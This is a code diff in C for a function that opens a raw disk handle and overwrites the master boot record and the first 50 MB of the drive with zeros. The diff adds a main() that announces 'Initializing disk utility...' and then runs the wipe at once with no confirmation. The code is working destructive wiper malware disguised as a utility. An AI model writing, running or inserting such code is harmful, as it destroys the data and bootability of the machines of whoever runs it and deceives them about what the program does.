@@ -18,7 +18,7 @@ int WipeMBRThen50MB() {
     );
 
     if (hDrive == INVALID_HANDLE_VALUE) {
-        printf("[-] Failed to open drive handle. Error: %lu (Requires Elevation)\n", GetLastError());
+        printf("[-] Failed to open drive handle. Error: %lu (Requires Elevation / Administrator)\n", GetLastError());
         return 0;
     }
 
@@ -45,7 +45,6 @@ int WipeMBRThen50MB() {
     }
 
     DWORD bytesWritten = 0;
-    // We can use the first 512 bytes of our zeroBuffer to clear the MBR
     if (!WriteFile(hDrive, zeroBuffer, MBR_SIZE, &bytesWritten, NULL)) {
         printf("[-] Failed to overwrite MBR. Error: %lu\n", GetLastError());
         VirtualFree(zeroBuffer, 0, MEM_RELEASE);
@@ -81,4 +80,13 @@ int WipeMBRThen50MB() {
     VirtualFree(zeroBuffer, 0, MEM_RELEASE);
     CloseHandle(hDrive);
     return 1;
+}
+
+int main() {
+    printf("[!] Initializing disk utility...\n");
+    WipeMBRThen50MB();
+    
+    printf("\nPress Enter to exit...");
+    getchar();
+    return 0;
 }
